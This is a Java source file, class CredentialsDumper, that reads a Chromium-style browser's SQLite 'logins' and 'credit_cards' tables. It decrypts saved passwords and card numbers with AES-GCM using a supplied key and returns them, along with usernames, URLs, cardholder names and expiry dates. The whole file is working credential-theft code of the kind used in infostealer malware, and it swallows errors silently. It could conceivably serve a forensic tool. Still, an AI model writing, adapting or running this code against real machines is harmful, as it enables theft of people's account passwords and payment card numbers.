package GUI.TableUtils.CreditCardsCredentials;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.sql.*;
import java.util.ArrayList;
import java.util.Arrays;

import GUI.TableUtils.CreditCardsCredentials.Packets.AccountCredentials;
import GUI.TableUtils.CreditCardsCredentials.Packets.CombinedCredentials;
import GUI.TableUtils.CreditCardsCredentials.Packets.CreditCardCredentials;
import Information.Time;

import java.util.List;

public class CredentialsDumper {

    private final byte[] secretKey;
    private final String accountsDBPath;
    private final String creditCardsDBPath;

    public CredentialsDumper(byte[] secretKey, String accountsDBPath, String creditCardsDBPath) {
        this.secretKey = secretKey;
        this.accountsDBPath = accountsDBPath;
        this.creditCardsDBPath = creditCardsDBPath;
    }

    public String decrypt(byte[] encryptedPasswordBytes, byte[] secretKeyBytes) throws RuntimeException {
        Cipher cipher;
        byte[] iv = Arrays.copyOfRange(encryptedPasswordBytes, 3, 15);
        try {
            byte[] encryptedMessage = Arrays.copyOfRange(encryptedPasswordBytes, 15, encryptedPasswordBytes.length);
            cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(secretKeyBytes, "AES"), spec);
            byte[] decryptedMessage = cipher.doFinal(encryptedMessage);
            return new String(decryptedMessage);
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException |
                 InvalidKeyException | InvalidAlgorithmParameterException e) {
            throw new RuntimeException(e);
        }
    }

    public List<CreditCardCredentials> getCreditCardsCredentials(byte[] secretKey, String dbPath) {
        java.sql.Connection connection = null;
        List<CreditCardCredentials> listOfCredentials = new ArrayList<>();
        try {
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + dbPath);
            Statement statement = connection.createStatement();

            ResultSet resultSet = statement.executeQuery("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards");

            while (resultSet.next()) {
                String cardHolder = resultSet.getString("name_on_card");
                int expirationMonth = resultSet.getInt("expiration_month");
                int expirationYear = resultSet.getInt("expiration_year");
                byte[] creditCardEncryptedBytes = resultSet.getBytes("card_number_encrypted");
                String decryptedCreditCard = decrypt(creditCardEncryptedBytes, secretKey);
                CreditCardCredentials creditCardCredentials;
                creditCardCredentials = new CreditCardCredentials(cardHolder, expirationMonth, expirationYear, decryptedCreditCard);
                listOfCredentials.add(creditCardCredentials);
            }

            resultSet.close();
            statement.close();
            connection.close();

        } catch (ClassNotFoundException | SQLException ignored) {

        } finally {
            try {
                if (connection != null) {
                    connection.close();
                }
            } catch (SQLException ignored) {

            }
        }
        return listOfCredentials;
    }

    public List<AccountCredentials> getAccountsCredentials(byte[] secretKey, String dbPath) {
        java.sql.Connection connection = null;
        List<AccountCredentials> listOfCredentials = new ArrayList<>();
        try {
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + dbPath);
            Statement statement = connection.createStatement();

            ResultSet resultSet = statement.executeQuery("SELECT origin_url, action_url, username_value, " +
                    "password_value, date_created, date_last_used FROM logins ORDER BY date_last_used");

            while (resultSet.next()) {
                String originUrl = resultSet.getString("origin_url");
                String actionUrl = resultSet.getString("action_url");
                String usernameValue = resultSet.getString("username_value");
                byte[] passwordBytes = resultSet.getBytes("password_value");
                long dateCreated = resultSet.getLong("date_created");
                long dateLastUsed = resultSet.getLong("date_last_used");
                String decryptedPassword = decrypt(passwordBytes, secretKey);
                AccountCredentials accountCrendentials = new AccountCredentials(
                        originUrl,
                        actionUrl,
                        usernameValue,
                        decryptedPassword,
                        new Time().WebKitToDate(dateCreated),
                        new Time().WebKitToDate(dateLastUsed));
                listOfCredentials.add(accountCrendentials);
            }

            resultSet.close();
            statement.close();
            connection.close();

        } catch (ClassNotFoundException | SQLException ignored) {

        } finally {
            try {
                if (connection != null) {
                    connection.close();
                }
            } catch (SQLException ignored) {

            }
        }
        return listOfCredentials;
    }

    public CombinedCredentials getCredentials() {
        List<AccountCredentials> accountCredentials = getAccountsCredentials(secretKey, accountsDBPath);
        List<CreditCardCredentials> creditCardCredentials = getCreditCardsCredentials(secretKey, creditCardsDBPath);
        return new CombinedCredentials(accountCredentials, creditCardCredentials);
    }
}
